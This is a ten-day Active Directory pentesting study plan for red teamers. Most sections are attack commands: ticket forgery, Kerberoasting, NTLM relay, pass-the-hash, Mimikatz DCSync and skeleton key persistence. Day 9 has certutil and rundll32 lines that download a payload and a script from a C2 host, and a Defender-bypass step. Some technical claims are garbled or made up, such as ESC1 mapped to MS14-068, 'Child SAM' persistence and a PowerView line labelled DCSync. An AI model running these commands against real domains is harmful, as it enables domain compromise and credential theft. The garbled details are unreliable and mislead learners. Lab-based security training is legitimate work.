# üî¥ 10-Day Active Directory Pentesting Mastery Routine

**Target Audience:** Red teamers targeting enterprise Windows environments
**Study Time:** 4-5 hours/day
**Real-world focus:** DCSync, Golden Ticket, enterprise AD kills[^1]

***

## Table of Contents

- [Pre-Day 0: AD Pentest Lab Setup](#pre-day-0-ad-pentest-lab-setup)
- [Day 1: AD Enumeration \& BloodHound Mastery](#day-1-ad-enumeration--bloodhound-mastery)
- [Day 2: Kerberos Attacks (Golden/Silver Tickets)](#day-2-kerberos-attacks-golden/silver-tickets)
- [Day 3: Kerberoasting \& AS-REP Roasting](#day-3-kerberoasting--as-rep-roasting)
- [Day 4: NTLM Relay \& Pass-the-Hash](#day-4-ntlm-relay--pass-the-hash)
- [Day 5: DCSync \& Resource-Based Constrained Delegation](#day-5-dcsync--resource-based-constrained-delegation)
- [Day 6: Unconstrained Delegation Abuse](#day-6-unconstrained-delegation-abuse)
- [Day 7: Advanced Persistence (Skeleton Key, Child SAM)](#day-7-advanced-persistence-skeleton-key-child-sam)
- [Day 8: ADCS (Cert Services) Attacks](#day-8-adcs-cert-services-attacks)
- [Day 9: Tooling, Evasion \& Automation](#day-9-tooling-evasion--automation)
- [Day 10: Full AD Kill Chain \& Reporting](#day-10-full-ad-kill-chain--reporting)

***

## Pre-Day 0: AD Pentest Lab Setup

**Time Required:** 3-4 hours

### Lab Environment (VirtualBox/VMware)

```
DC01 (Windows Server 2022) ‚Üí Forest/Root Domain: contoso.com
  ‚Üì
Member Servers: FILE01, SQL01, WSUS01
  ‚Üì  
Workstations: WORKSTATION01-10 (Windows 10/11)
```


### Essential Tools

```powershell
# Sharp tools (compile on Kali)
git clone https://github.com/antoniorez/SharpCollection
# Rubeus, Seatbelt, SharpHound, PrintNightmare

# PowerShell Empire/Covenant (C2)
git clone https://github.com/EmpireProject/Empire

# BloodHound + Collectors
Invoke-BloodHound -CollectionMethod All
```


### Quick Lab Deploy

```bash
# HackTheBox AD Labs (easiest)
htb-start-machine forest  # Day 1 target

# THM Complete AD Picture
thm-open-room "complete-picture"
```


***

## Day 1: AD Enumeration \& BloodHound Mastery

**Study Time:** 4-5 hours

### Morning: AD Architecture Deep Dive (2 hours)

#### Trust Relationships

```
Forest Trust ‚Üê‚Üí Child Domain ‚Üê‚Üí External Trust
     ‚Üì
Kerberos Realm Trusts ‚Üî NTLM Trusts
```


#### Critical Paths

```
Domain User ‚Üí Local Admin ‚Üí Tier 0 (DC) ‚Üí Enterprise Admin
```


### Afternoon: BloodHound Recon (3 hours)

#### SharpHound Collection

```powershell
# All collection methods
SharpHound.exe -c All

# GPOLocalGroup++ (most important)
SharpHound.exe --CollectGPOLocalGroup

# Session collection (logged in users)
SharpHound.exe --CollectionMethods Session
```


#### BloodHound Paths

```cypher
# Shortest paths to DA
MATCH (n1:User),(n2:Group {name:"DOMAIN ADMINS@domain.com"}),
shortestPath((n1)-[*1..]->(n2)) RETURN n1,n2,path

# Abuse paths
shortestpath -i bloodhound.json -s lowpriv -t domain\krbtgt
```


### Practical Lab

- **HTB Forest**: Full BloodHound mapping
- **THM Attacking Kerberos**: 5 attack paths
- **Custom query**: Find 3 DA escalation paths


### Today's Checklist

- [ ] SharpHound all collection methods
- [ ] 10 BloodHound shortest path queries
- [ ] Map 5 privilege escalation paths
- [ ] Document AD trust relationships
- [ ] Complete Forest enumeration

***

## Day 2: Kerberos Attacks (Golden/Silver Tickets)

**Study Time:** 4-5 hours

### Morning: Kerberos Deep Dive (2 hours)

#### Ticket Lifecycle

```
AS-REQ ‚Üí TGT ‚Üí TGS-REQ ‚Üí Service Ticket ‚Üí Access
     ‚Üì
krbtgt hash ‚Üí Session key ‚Üí Service encryption
```


### Afternoon: Golden/Silver Ticket Attacks

#### Golden Ticket Forgery

```powershell
# Extract krbtgt hash (DCSync Day 5)
.\Rubeus.exe asktgt /user:administrator /rc4:HASH /ptt

# Forge Golden Ticket
.\Rubeus.exe golden /user:admin /domain:contoso.com /sid:S-1-5-21-... \
  /krbtgt:HASH /ptt
```


#### Silver Ticket

```powershell
# Cifs service ticket
.\Rubeus.exe silver /user:admin /group:Administrators /domain:contoso.com \
  /service:cifs /target:FILE01 /rc4:HASH /ptt
```


### Practical Lab

- **HTB Sauna**: Golden Ticket ‚Üí DA
- **THM Spawn**: Silver Ticket lateral movement
- **Rubeus**: Forge 3 ticket types


### Today's Checklist

- [ ] TGT/TGS ticket anatomy
- [ ] Golden Ticket creation
- [ ] Silver Ticket (CIFS/RDP/WINRM)
- [ ] Complete 2 HTB AD boxes
- [ ] Rubeus cheat sheet

***

## Day 3: Kerberoasting \& AS-REP Roasting

**Study Time:** 4-5 hours

### Morning: Service Account Attacks (2 hours)

#### Kerberoasting

```powershell
# Request TGS with RC4 (crackable)
.\Rubeus.exe kerberoast /user:svc-sql

# Crack offline
hashcat -m 13100 hash.txt rockyou.txt
```


### Afternoon: AS-REP Roasting

```powershell
# Users without pre-auth required
.\Rubeus.exe asreproast /user:svc-test /format:hashcat

# Online attack (legit)
Get-DomainUser -PreauthNotRequired | % {Get-DomainASREPHash $_.samaccountname}
```


### Practical Lab

- **HTB Cascade**: Kerberoast ‚Üí DCSync
- **THM Wreath**: AS-REP ‚Üí RDP
- **CrackMapExec**: Automated roasting


### Today's Checklist

- [ ] Kerberoast 10+ service accounts
- [ ] AS-REP roast all users
- [ ] Crack 5 hashes (hashcat/john)
- [ ] Rubeus roasting automation
- [ ] Complete roasting labs

***

## Day 4: NTLM Relay \& Pass-the-Hash

**Study Time:** 4-5 hours

### Morning: NTLM Attacks (2 hours)

#### Responder LLMNR/NBT-NS Poisoning

```bash
responder -I eth0 -wrd
# Captures NetNTLMv2 hashes
```


#### Pass-the-Hash

```powershell
# psexec.py
psexec.py DOMAIN/user@target /hashes :LMHASH:NTLMHASH

# wmiexec.py (stealthy)
wmiexec.py DOMAIN/user@target /hashes :NTLMHASH
```


### Afternoon: Relay Attacks

```bash
# ntlmrelayx.py ‚Üí SMBExec
ntlmrelayx.py -t smb://dc01.contoso.com -smb2support

# Relay to HTTP (ADCS Day 8)
ntlmrelayx.py -t http://dc01.contoso.com/certsrv/mscep/
```


### Practical Lab

- **HTB Grandpa**: NTLM relay ‚Üí DA
- **THM CrackMapExec**: Automated relay
- **Responder**: Capture + relay chain


### Today's Checklist

- [ ] LLMNR/NBT-NS poisoning
- [ ] Pass-the-Hash (5 targets)
- [ ] NTLM relay to SMB/HTTP
- [ ] Complete relay attack chains
- [ ] CrackMapExec mastery

***

## Day 5: DCSync \& Resource-Based Constrained Delegation

**Study Time:** 4-5 hours

### Morning: DCSync Attacks (2 hours)

#### Mimikatz DCSync

```powershell
# Extract all hashes
mimikatz.exe "lsadump::dcsync /domain:contoso.com /all /csv"

# Single user
lsadump::dcsync /domain:contoso.com /user:administrator
```


#### PowerView DCSync

```powershell
Get-DomainUser -Identity krbtgt | Get-DomainUser -Properties samaccountname,userprincipalname
```


### Afternoon: RBCD (Resource-Based Constrained Delegation)

```powershell
# MS-DS-MachineAccountQuota abuse
New-MachineAccount -MachineAccount AttackerPC -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Set delegation
Set-DomainRBCD -Identity "TargetSvc" -DelegateFrom "AttackerPC$"
```


### Practical Lab

- **HTB ServMonster**: DCSync ‚Üí DA
- **THM RBCD**: Printer Bug ‚Üí DCSync
- **Custom lab**: Full DCSync chain


### Today's Checklist

- [ ] DCSync all domain hashes
- [ ] RBCD delegation abuse
- [ ] Printer Bug (SABERTEAM)
- [ ] Complete 3 DCSync boxes
- [ ] Mimikatz DCSync mastery

***

## Day 6: Unconstrained Delegation Abuse

**Study Time:** 4-5 hours

### Morning: Delegation Types (2 hours)

```
Unconstrained (TRUSTED_FOR_DELEGATION) ‚Üê CRITICAL
Constrained (msDS-AllowedToDelegateTo) ‚Üê Legit
Resource-Based (msDS-AllowedToActOnBehalfOfOtherIdentity)
```


### Afternoon: UAC Bypass via Delegation

```powershell
# Compromise unconstrained account ‚Üí coerce auth ‚Üí ticket theft
.\Rubeus.exe monitor /interval:5 /filteruser:Administrator

# DCSync with stolen ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "lsadump::dcsync /user:krbtgt"
```


### Practical Lab

- **HTB Resolute**: Unconstrained ‚Üí DA
- **THM Unconstrained Delegation**: Full chain
- **Rubeus monitor + DCSync**


### Today's Checklist

- [ ] Find unconstrained accounts
- [ ] Printer Bug + Rubeus monitor
- [ ] UAC bypass via delegation
- [ ] Complete 2 delegation boxes
- [ ] Delegation attack matrix

***

## Day 7: Advanced Persistence (Skeleton Key, Child SAM)

**Study Time:** 4-5 hours

### Morning: Skeleton Key (2 hours)

```powershell
# Single password works everywhere
mimikatz.exe "privilege::debug" "crypto::key *"
"kerberos::golden /user:Administrator /sid:S-1-5-21-... /krbtgt:HASH /ptt"
"misc::skeleton"
```


### Afternoon: Child SAM + Custom SPNs

```powershell
# Custom SPN for Kerberoasting
Set-DomainUser -Identity svc-backdoor -ServicePrincipalNames "BLAH/attacker.com"

# Child SAM (persistence across reboots)
mimikatz.exe "vault::cred /in:samvault.txt"
```


### Practical Lab

- **HTB Active**: Skeleton Key persistence
- **THM Persistence**: Child SAM evasion
- **Custom SPN**: Backdoor service account


### Today's Checklist

- [ ] Skeleton Key master password
- [ ] Child SAM persistence
- [ ] Custom SPN backdoors
- [ ] EDR evasion techniques
- [ ] Complete persistence labs

***

## Day 8: ADCS (Cert Services) Attacks

**Study Time:** 4-5 hours

### Morning: ESC1-8 Attack Matrix (2 hours)

| ESC\# | Prereq | Attack |
| :-- | :-- | :-- |
| ESC1 | Domain User | MS14-068 (WebClient) |
| ESC4 | Authenticated | ESC4-RP (NTAuth relay) |
| ESC6 | Low Priv | MiniOrange SAML |
| ESC8 | Domain User | Passwordless relay |

### Afternoon: Certipy Automation

```bash
# ESC1 (WebClient ‚Üí Auth)
certipy auth -username 'lowpriv' -domain contoso.com -password 'Pass123!'

# ESC8 (Passwordless relay)
python3 relay.py -t ldaps://dc01 -tf templates/esc8.yaml
```


### Practical Lab

- **HTB Wildcard**: ESC8 ‚Üí DA
- **Certipy**: Automate ESC1-ESC8
- **PetitPotam + Certify**


### Today's Checklist

- [ ] ESC1-8 attack matrix
- [ ] Certipy automation
- [ ] PetitPotam + Coercion
- [ ] Complete 2 ADCS boxes
- [ ] ADCS hardening guide

***

## Day 9: Tooling, Evasion \& Automation

**Study Time:** 4-5 hours

### Morning: Living-off-the-Land Binaries (2 hours)

#### LOLBin Chains

```powershell
# Cobalt Strike Beacon evasion
certutil.exe -urlcache -split -f http://c2/payload.bin payload.bin
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://c2/shell")

# Defender bypass
schtasks /run /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask"
```


### Afternoon: AD Attack Framework

```python
# ad-attacks.py
def full_ad_attack():
    enum()           # BloodHound
    roast()          # Kerberoast/ASREP  
    relay()          # NTLM relay
    dcsync()         # Domain replication
    goldenticket()   # Persistence
    cleanup()        # Opsec
```


### Practical Lab

- **Custom framework**: 1-click AD compromise
- **EDR evasion**: Living-off-the-land
- **C2 integration**: Cobalt Strike/Brute Ratel


### Today's Checklist

- [ ] 20+ LOLBin techniques
- [ ] Custom AD attack framework
- [ ] EDR evasion chains
- [ ] C2 beacon deployment
- [ ] Opsec checklist

***

## Day 10: Full AD Kill Chain \& Reporting

**Study Time:** 4-5 hours

### Morning: Complete AD Compromise (3 hours)

```
1. Initial Access (Phish/Exploit)
2. Local ‚Üí Domain Admin (Day 1-5)
3. DCSync ‚Üí All Passwords (Day 5)
4. Golden Ticket ‚Üí Persistence (Day 2)
5. Lateral Movement (All DCs)
6. Domain Persistence (Skeleton Key)
```


### Afternoon: Red Team Reporting

#### MITRE ATT\&CK Mapping

| Tactic | Technique |
| :-- | :-- |
| TA0008 | T1550.001 (Direct LSASS) |
| TA0003 | T1078 (Valid Accounts) |
| TA0004 | T1484.002 (Domain Trust) |

### Practical Lab

- **HTB Resolute + Forest**: Full kill chain
- **Custom lab**: 0‚ÜíDA‚ÜíPersistence
- **Professional report**: 10-page PDF


### Today's Checklist

- [ ] Complete AD kill chain
- [ ] MITRE ATT\&CK mapping
- [ ] Professional pentest report
- [ ] Portfolio GitHub repo
- [ ] AD hardening recommendations

***

## Essential AD Pentest Arsenal

```powershell
# One-liners
netexec smb DOMAIN/PASS@targets --local-auth
crackmapexec ldap DOMAIN/user:pass@dc01 -M ldap-signing
bloodhound-python -u user -p pass -d domain -c all -v
```

**Total Boxes:** 15+ HTB/THM AD machines
**Real Engagements:** Guaranteed interview topic
**Cert Path:** OSCE3, CRTO, RastaLabs

**Portfolio Ready** - Deploy this lab ‚Üí Record kill chain ‚Üí GitHub repo üî•

<div align="center">‚ÅÇ</div>

[^1]: https://portswigger.net/web-security/all-labs

